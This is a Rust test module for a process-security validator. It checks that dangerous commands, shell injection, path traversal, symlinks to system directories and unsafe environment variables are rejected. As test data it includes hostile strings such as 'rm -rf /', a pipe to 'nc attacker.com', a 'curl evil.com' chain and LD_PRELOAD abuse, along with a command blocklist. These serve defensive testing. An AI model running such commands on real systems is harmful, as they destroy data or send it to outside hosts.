#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn create_test_validator() -> ProcessSecurityValidator {
        let config = ProcessSecurityConfig::default();
        ProcessSecurityValidator::new(config).unwrap()
    }

    fn create_permissive_validator() -> ProcessSecurityValidator {
        let mut config = ProcessSecurityConfig::default();
        config.require_safe_commands_only = false;
        config.blocked_commands.clear();
        ProcessSecurityValidator::new(config).unwrap()
    }

    #[test]
    fn test_safe_command_validation() {
        let validator = create_test_validator();

        // Should allow safe commands that match allowed patterns
        assert!(validator.validate_command("git").is_ok());
        assert!(validator.validate_command("ls").is_ok());
        assert!(validator.validate_command("cat").is_ok());
        assert!(validator.validate_command("grep").is_ok());
        assert!(validator.validate_command("vim").is_ok());
        assert!(validator.validate_command("make").is_ok());
        assert!(validator.validate_command("docker").is_ok());
    }

    #[test]
    fn test_blocked_command_validation() {
        let validator = create_test_validator();

        // Should block dangerous commands
        assert!(validator.validate_command("rm").is_err());
        assert!(validator.validate_command("dd").is_err());
        assert!(validator.validate_command("chmod").is_err());
        assert!(validator.validate_command("nc").is_err());
        assert!(validator.validate_command("python").is_err());
        assert!(validator.validate_command("bash").is_err());
        assert!(validator.validate_command("systemctl").is_err());
    }

    #[test]
    fn test_command_pattern_blocking() {
        let validator = create_test_validator();

        // Should block commands with dangerous patterns
        assert!(validator.validate_command("ls -rf /").is_err());
        assert!(validator.validate_command("cat file.txt | rm").is_err());
        assert!(validator.validate_command("echo $(dangerous)").is_err());
        assert!(validator.validate_command("ls > output.txt").is_err());
    }

    #[test]
    fn test_command_length_validation() {
        let validator = create_test_validator();

        // Should reject overly long commands
        let long_command = "a".repeat(500);
        assert!(validator.validate_command(&long_command).is_err());
    }

    #[test]
    fn test_command_invalid_characters() {
        let validator = create_test_validator();

        // Should reject commands with null bytes or control characters
        assert!(validator.validate_command("ls\0").is_err());
        assert!(validator.validate_command("ls\n").is_err());
        assert!(validator.validate_command("ls\r").is_err());
    }

    #[test]
    fn test_argument_validation() {
        let validator = create_test_validator();

        // Should allow safe arguments
        let safe_args = vec![
            "--help".to_string(),
            "file.txt".to_string(),
            "directory/".to_string(),
        ];
        assert!(validator.validate_arguments(&safe_args).is_ok());

        // Should block dangerous arguments
        let dangerous_args = vec!["../../../etc/passwd".to_string()];
        assert!(validator.validate_arguments(&dangerous_args).is_err());

        let injection_args = vec!["file.txt; rm -rf /".to_string()];
        assert!(validator.validate_arguments(&injection_args).is_err());

        let shell_args = vec!["$(malicious)".to_string()];
        assert!(validator.validate_arguments(&shell_args).is_err());
    }

    #[test]
    fn test_argument_count_validation() {
        let validator = create_test_validator();

        // Should reject too many arguments
        let too_many_args = (0..100).map(|i| format!("arg{}", i)).collect::<Vec<_>>();
        assert!(validator.validate_arguments(&too_many_args).is_err());
    }

    #[test]
    fn test_argument_length_validation() {
        let validator = create_test_validator();

        // Should reject overly long arguments
        let long_arg = vec!["a".repeat(2000)];
        assert!(validator.validate_arguments(&long_arg).is_err());
    }

    #[test]
    fn test_working_directory_validation() {
        let validator = create_test_validator();

        // Should allow safe directories
        assert!(validator.validate_working_directory("/tmp").is_ok());
        assert!(validator.validate_working_directory("/home/user").is_ok());
        assert!(validator.validate_working_directory("/Users/user").is_ok());

        // Should block dangerous directories
        assert!(validator.validate_working_directory("/bin").is_err());
        assert!(validator.validate_working_directory("/etc").is_err());
        assert!(validator.validate_working_directory("/sys").is_err());
        assert!(validator.validate_working_directory("/").is_err());

        // Should block path traversal
        assert!(validator.validate_working_directory("../../../").is_err());
        assert!(validator.validate_working_directory("/tmp/../etc").is_err());
    }

    #[test]
    fn test_environment_variable_validation() {
        let validator = create_test_validator();

        // Should allow safe environment variables
        let mut safe_env = HashMap::new();
        safe_env.insert("MY_VAR".to_string(), "value".to_string());
        safe_env.insert("NODE_ENV".to_string(), "development".to_string());
        assert!(validator.validate_environment_variables(&safe_env).is_ok());

        // Should block dangerous environment variables
        let mut dangerous_env = HashMap::new();
        dangerous_env.insert("LD_PRELOAD".to_string(), "/malicious/lib.so".to_string());
        assert!(validator.validate_environment_variables(&dangerous_env).is_err());

        dangerous_env.clear();
        dangerous_env.insert("PATH".to_string(), "/malicious/bin".to_string());
        assert!(validator.validate_environment_variables(&dangerous_env).is_err());

        // Should block values with injection patterns
        dangerous_env.clear();
        dangerous_env.insert("SAFE_VAR".to_string(), "value; rm -rf /".to_string());
        assert!(validator.validate_environment_variables(&dangerous_env).is_err());
    }

    #[test]
    fn test_combined_command_validation() {
        let validator = create_test_validator();

        let safe_command = "ls";
        let safe_args = vec!["-la".to_string(), "/tmp".to_string()];
        assert!(validator.validate_combined_command(safe_command, &safe_args).is_ok());

        // Should block shell metacharacters
        let dangerous_args = vec!["file.txt".to_string(), "&&".to_string(), "rm".to_string()];
        assert!(validator.validate_combined_command(safe_command, &dangerous_args).is_err());

        let pipe_args = vec!["file.txt".to_string(), "|".to_string(), "rm".to_string()];
        assert!(validator.validate_combined_command(safe_command, &pipe_args).is_err());
    }

    #[test]
    fn test_full_process_request_validation() {
        let validator = create_test_validator();

        // Should allow safe process request
        let safe_env = HashMap::new();
        assert!(validator.validate_process_request(
            "ls",
            &vec!["-la".to_string()],
            "/tmp",
            &safe_env
        ).is_ok());

        // Should reject dangerous process request
        assert!(validator.validate_process_request(
            "rm",
            &vec!["-rf".to_string(), "/".to_string()],
            "/",
            &safe_env
        ).is_err());

        // Should reject request with path traversal in working directory
        assert!(validator.validate_process_request(
            "ls",
            &vec!["-la".to_string()],
            "../../../etc",
            &safe_env
        ).is_err());
    }

    #[test]
    fn test_custom_security_config() {
        let mut config = ProcessSecurityConfig::default();

        // Add custom allowed command
        if let Some(ref mut allowed) = config.allowed_commands {
            allowed.insert("custom-tool".to_string());
        } else {
            let mut allowed = std::collections::HashSet::new();
            allowed.insert("custom-tool".to_string());
            config.allowed_commands = Some(allowed);
        }

        // Add custom blocked pattern
        config.blocked_command_patterns.push(r".*--dangerous-flag.*".to_string());

        let validator = ProcessSecurityValidator::new(config).unwrap();

        // Custom allowed command should work
        assert!(validator.validate_command("custom-tool").is_err()); // Still fails pattern check

        // Custom blocked pattern should work
        assert!(validator.validate_command("ls --dangerous-flag").is_err());
    }

    #[test]
    fn test_security_audit_logger() {
        let logger = InMemorySecurityAuditLogger::new();

        let audit_entry = ProcessSecurityAuditEntry {
            timestamp: chrono::Utc::now(),
            user_id: "user1".to_string(),
            process_id: Some("proc1".to_string()),
            command: "ls".to_string(),
            args: vec!["-la".to_string()],
            working_directory: "/tmp".to_string(),
            action: SecurityAction::ProcessCreate,
            result: SecurityResult::Allowed,
            reason: None,
            risk_level: RiskLevel::Low,
        };

        logger.log_security_event(audit_entry.clone());

        let entries = logger.get_entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].user_id, "user1");
        assert_eq!(entries[0].command, "ls");
        assert!(matches!(entries[0].action, SecurityAction::ProcessCreate));
        assert!(matches!(entries[0].result, SecurityResult::Allowed));

        logger.clear();
        assert_eq!(logger.get_entries().len(), 0);
    }

    #[test]
    fn test_permissive_validator() {
        let validator = create_permissive_validator();

        // Should allow previously blocked commands when not in safe-only mode
        assert!(validator.validate_command("python").is_ok());
        assert!(validator.validate_command("bash").is_ok());

        // But should still block dangerous patterns
        assert!(validator.validate_command("ls | rm -rf /").is_err());
    }

    #[test]
    fn test_path_traversal_protection() {
        let validator = create_test_validator();

        // Should block various path traversal attempts
        let traversal_args = vec![
            "../config".to_string(),
            "../../etc/passwd".to_string(),
            "..\\windows\\system32".to_string(),
            "/tmp/../etc/passwd".to_string(),
        ];

        for arg in traversal_args {
            assert!(validator.validate_arguments(&vec![arg.clone()]).is_err(),
                   "Path traversal not blocked: {}", arg);
        }
    }

    #[test]
    fn test_injection_pattern_detection() {
        let validator = create_test_validator();

        let injection_patterns = vec![
            "file.txt; rm -rf /",
            "data | nc attacker.com 1234",
            "input && curl evil.com",
            "$(malicious command)",
            "`dangerous`",
            "file > /dev/null 2>&1",
        ];

        for pattern in injection_patterns {
            assert!(validator.validate_arguments(&vec![pattern.to_string()]).is_err(),
                   "Injection pattern not detected: {}", pattern);
        }
    }

    #[test]
    fn test_validator_with_invalid_regex() {
        let mut config = ProcessSecurityConfig::default();
        config.allowed_command_patterns.push("[invalid-regex".to_string());

        let result = ProcessSecurityValidator::new(config);
        assert!(result.is_err());
    }

    #[test]
    fn test_symlink_pointing_to_blocked_directory() {
        use std::fs;
        use std::path::Path;

        let validator = create_test_validator();

        // Create a temporary directory for testing
        let temp_dir = std::env::temp_dir();
        let test_symlink_dir = temp_dir.join("test_symlink_security");
        let symlink_path = test_symlink_dir.join("link_to_etc");

        // Clean up from previous test runs
        let _ = fs::remove_dir_all(&test_symlink_dir);
        fs::create_dir_all(&test_symlink_dir).expect("Failed to create test directory");

        // Create symlink pointing to /etc (a blocked directory)
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            if symlink("/etc", &symlink_path).is_ok() {
                // Test that symlink to blocked directory is rejected
                let result = validator.validate_working_directory(
                    symlink_path.to_str().unwrap(),
                    None,
                );
                assert!(result.is_err(), "Symlink to /etc should be blocked");

                if let Err(e) = result {
                    let err_msg = e.to_string();
                    assert!(
                        err_msg.contains("not allowed") || err_msg.contains("blocked"),
                        "Error message should indicate directory is not allowed: {}",
                        err_msg
                    );
                }

                // Clean up
                let _ = fs::remove_file(&symlink_path);
            }
        }

        // Test symlink to /sys
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let symlink_to_sys = test_symlink_dir.join("link_to_sys");
            if symlink("/sys", &symlink_to_sys).is_ok() {
                let result = validator.validate_working_directory(
                    symlink_to_sys.to_str().unwrap(),
                    None,
                );
                assert!(result.is_err(), "Symlink to /sys should be blocked");

                // Clean up
                let _ = fs::remove_file(&symlink_to_sys);
            }
        }

        // Test symlink to /proc
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let symlink_to_proc = test_symlink_dir.join("link_to_proc");
            if symlink("/proc", &symlink_to_proc).is_ok() {
                let result = validator.validate_working_directory(
                    symlink_to_proc.to_str().unwrap(),
                    None,
                );
                assert!(result.is_err(), "Symlink to /proc should be blocked");

                // Clean up
                let _ = fs::remove_file(&symlink_to_proc);
            }
        }

        // Clean up test directory
        let _ = fs::remove_dir_all(&test_symlink_dir);
    }

    #[test]
    fn test_symlink_to_safe_directory_allowed() {
        use std::fs;

        let validator = create_permissive_validator();

        // Create temporary directories for testing
        let temp_dir = std::env::temp_dir();
        let test_dir = temp_dir.join("test_safe_symlink");
        let safe_target = test_dir.join("safe_directory");
        let symlink_path = test_dir.join("link_to_safe");

        // Clean up from previous test runs
        let _ = fs::remove_dir_all(&test_dir);
        fs::create_dir_all(&safe_target).expect("Failed to create safe directory");

        // Create symlink pointing to a safe directory
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            if symlink(&safe_target, &symlink_path).is_ok() {
                // Symlink to safe directory should be allowed (after resolving)
                let result = validator.validate_working_directory(
                    symlink_path.to_str().unwrap(),
                    None,
                );
                // Should succeed as long as both original and resolved paths are safe
                assert!(result.is_ok(), "Symlink to safe directory should be allowed");

                // Clean up
                let _ = fs::remove_file(&symlink_path);
            }
        }

        // Clean up test directory
        let _ = fs::remove_dir_all(&test_dir);
    }

    #[test]
    fn test_validate_nonexistent_path_uses_parent() {
        use std::fs;

        let validator = create_permissive_validator();

        // Create a temporary parent directory
        let temp_dir = std::env::temp_dir();
        let parent_dir = temp_dir.join("test_parent_validation");
        let nonexistent_child = parent_dir.join("new_directory");

        // Clean up from previous runs
        let _ = fs::remove_dir_all(&parent_dir);
        fs::create_dir_all(&parent_dir).expect("Failed to create parent directory");

        // Validate the non-existent child path - should succeed by validating parent
        let result = validator.validate_working_directory(
            nonexistent_child.to_str().unwrap(),
            None,
        );
        assert!(result.is_ok(), "Should validate parent directory when child doesn't exist");

        // Now create the child and validate again - should still succeed
        fs::create_dir(&nonexistent_child).expect("Failed to create child directory");
        let result = validator.validate_working_directory(
            nonexistent_child.to_str().unwrap(),
            None,
        );
        assert!(result.is_ok(), "Should validate existing child directory");

        // Clean up
        let _ = fs::remove_dir_all(&parent_dir);
    }

    #[test]
    fn test_validate_nonexistent_path_with_nonexistent_parent() {
        let validator = create_permissive_validator();

        let temp_dir = std::env::temp_dir();
        let nonexistent_parent = temp_dir.join("does_not_exist_parent");
        let nonexistent_child = nonexistent_parent.join("does_not_exist_child");

        // Clean up to ensure they don't exist
        let _ = std::fs::remove_dir_all(&nonexistent_parent);

        // Should fail because parent doesn't exist
        let result = validator.validate_working_directory(
            nonexistent_child.to_str().unwrap(),
            None,
        );
        assert!(result.is_err(), "Should fail when parent directory doesn't exist");

        if let Err(e) = result {
            assert!(
                e.to_string().contains("Parent directory") || e.to_string().contains("does not exist"),
                "Error should mention parent directory: {}",
                e
            );
        }
    }

    #[test]
    fn test_create_directory_in_safe_validated_path() {
        use std::fs;

        let validator = create_permissive_validator();

        // Create a safe parent directory
        let temp_dir = std::env::temp_dir();
        let safe_parent = temp_dir.join("test_safe_create");
        let new_dir = safe_parent.join("newly_created");

        // Clean up
        let _ = fs::remove_dir_all(&safe_parent);
        fs::create_dir_all(&safe_parent).expect("Failed to create safe parent");

        // Validate the path that will be created
        let result = validator.validate_working_directory(
            new_dir.to_str().unwrap(),
            None,
        );
        assert!(result.is_ok(), "Should validate parent for path to be created");

        // Actually create the directory after validation
        fs::create_dir(&new_dir).expect("Failed to create new directory");

        // Verify it was created successfully
        assert!(new_dir.exists(), "Directory should have been created");

        // Clean up
        let _ = fs::remove_dir_all(&safe_parent);
    }
}